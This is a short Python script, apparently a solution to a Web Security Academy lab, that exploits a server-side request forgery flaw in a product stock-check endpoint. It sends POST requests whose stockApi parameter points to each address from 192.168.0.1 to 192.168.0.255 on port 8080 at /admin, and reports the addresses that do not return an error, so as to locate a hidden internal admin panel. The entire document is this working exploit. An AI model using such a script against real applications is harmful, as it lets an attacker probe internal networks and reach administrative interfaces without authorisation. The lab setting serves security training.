import requests


url = 'https://0a8a008004b14fc780180989004300c2.web-security-academy.net/product/stock'


for num in range(1,256):
            data = f'stockApi=http://192.168.0.{num}:8080/admin'
            response = requests.post(url, data=data)
            #print(response.status_code)

            if response.status_code != 500:
                print("This ip valid: http://192.168.0." + str(num) + ':8080/admin')
                continue
else:
    print("Done")
    exit(1)        